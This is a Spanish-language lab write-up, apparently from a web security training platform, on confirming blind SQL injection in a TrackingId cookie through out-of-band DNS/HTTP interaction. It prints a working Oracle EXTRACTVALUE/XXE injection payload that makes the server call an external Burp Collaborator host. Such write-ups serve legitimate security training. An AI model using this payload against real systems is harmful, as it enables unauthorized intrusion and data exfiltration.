Lab 16: Blind SQL injection with out-of-band interaction

Practitioner

Indicaciones

Este laboratorio presenta una vulnerabilidad de inyección SQL ciega en la cookie de seguimiento (TrackingId). A diferencia de escenarios anteriores, el servidor procesa la consulta de forma que no se puede inferir información a través de respuestas condicionales, errores o retardos de tiempo. El objetivo es confirmar la vulnerabilidad provocando una interacción de red fuera de banda con un dominio externo controlado por Burp Collaborator.

Procedimiento Técnico

  • Generar un subdominio único utilizando el cliente de Burp Collaborator.
  • Identificar que el motor de base de datos es Oracle, lo cual permite el uso de funciones de red como EXTRACTVALUE o UTL_HTTP.
  • Inyectar un payload en la cookie TrackingId que obligue a la base de datos a realizar una consulta DNS o HTTP hacia el dominio del Collaborator.
  • Verificar en la pestaña de Collaborator la recepción de peticiones entrantes desde la infraestructura del laboratorio, lo que confirma la ejecución exitosa del comando SQL.
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ID-COLLABORATOR.oastify.com/"> %remote;]>'),'/l') FROM dual--

Verificación y Explicación

La técnica de inyección fuera de banda (OOB) es el último recurso cuando los canales de exfiltración tradicionales (In-band o Blind) están bloqueados o son inestables. Al aprovechar funciones de la base de datos que interactúan con el sistema de archivos o la red, podemos forzar al servidor a enviarnos una señal externa. En este caso, el uso de entidades externas XML (XXE) dentro de una función SQL permite disparar una petición de red. Si recibimos la interacción en nuestro servidor de escucha, tenemos evidencia irrefutable de que la inyección es posible y de que el servidor tiene salida a internet.
